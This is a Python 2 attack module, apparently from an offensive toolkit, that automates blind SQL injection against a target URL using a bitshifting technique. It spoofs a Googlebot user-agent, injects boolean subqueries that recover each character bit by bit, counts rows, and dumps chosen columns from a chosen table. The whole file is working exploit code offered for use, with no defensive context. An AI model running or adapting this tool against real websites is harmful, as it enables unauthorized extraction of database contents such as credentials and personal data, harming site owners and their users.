#!/usr/bin/python2

# Blind SQL Injection via the Bitshifting Method
# Method by Jelmer de Hen (https://www.exploit-db.com/papers/17073/)
# Module written by Eclipse of Team Salvation (http://ljdbosgro7jj4z7r.onion)

import requests

options = {
	"target" : "http://www.example.com/index.php?id=1",
	"cookies" : "",
	"row_condition" : "1",
	"follow_redirections" : 0,
	"user_agent" : "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"table_name" : "",
	"columns" : "col1,col2",
	"truth_string" : ""
}

dump = []

def fix_http(host):
    if ((not host.startswith("http://")) and (not host.startswith("https://"))):
        return "http://" + host
    else:
        return host
def fix_slash(host):
    if (host.endswith("/")):
        return host[:-1]
    else:
        return host

def request(target):
    headers = {"user-agent" : options["user_agent"]}
    return requests.get(target, headers=headers, cookies=options["cookies"], allow_redirects=bool(options["follow_redirections"])).text

def getNumberOfRows():
    count = 1
    s = ''
    while True:
        target = '%s and ((select ascii(substr(count(%s), {index}, 1)) from %s)>>{shift})={result}' % (options['target'], options['columns'].split(',')[0], options['table_name'])
        target = target.replace('{index}', str(count))
        char = getChar(target)
        if char == 1:
            return int(s)
        else:
            s += str(char)
            count += 1

def getChar(target):
    otarget = target
    byte = ''
    for x in range(8):
        target = otarget
        next_if_set = int(byte+'1', 2)
        target = target.replace('{shift}', str(7-x))
        target = target.replace('{result}', str(next_if_set))
        response = request(target)
        if options['truth_string'] in response:
            byte += '1'
        else:
            byte += '0'
    if byte == '00000000':
        return 1
    else:
        return chr(int(byte, 2))
		
def exploit():
    options["target"] = fix_http(options["target"])
    options["target"] = fix_slash(options["target"])
    columns = options['columns'].split(',')
    row_cells = []
    for column in columns:
        row_cells.append(column)
    dump.append(row_cells)
    if options["row_condition"] != '1':
        row_cells = []
        for column in columns:
            count = 1
            s = ''
            while True:
                target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s where %s)>>{shift})={result}' % (options['target'], column, options['table_name'], options['row_condition'])
                target = target.replace('{index}', str(count))
                char = getChar(target)
                if char == 1:
                    break
                else:
                    s += str(char)
                    count += 1
            row_cells.append(s)
        dump.append(row_cells)
    else:
        no_of_rows = getNumberOfRows()
        for x in range(no_of_rows):
            row_cells = []
            for column in columns:
                count = 1
                s = ''
                while True:
                    target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s limit {row_index},1)>>{shift})={result}' % (options['target'], column, options['table_name'])
                    target = target.replace('{row_index}', str(x))
                    target = target.replace('{index}', str(count))
                    char = getChar(target)
                    if char == 1:
                        break
                    else:
                        count += 1
                        s += str(char)
                row_cells.append(s)
            dump.append(row_cells)
    return dump
